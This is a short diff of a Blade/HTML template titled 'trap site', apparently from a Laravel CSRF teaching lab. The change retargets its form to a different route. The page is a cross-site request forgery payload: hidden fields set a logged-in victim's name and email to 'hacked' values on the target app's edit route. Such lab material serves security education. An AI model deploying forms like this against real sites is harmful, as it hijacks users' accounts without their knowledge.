@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>罠サイト</h1>
-    <form action="{{ route('post_csrf_edit') }}" method="post" name="f1">
+    <form action="{{ route('post_csrf_rem_edit') }}" method="post" name="f1">
         <input type="hidden" name="new_name" value="hacked">
         <input type="hidden" name="new_email" value="hacked@hacked.com">
     </form>
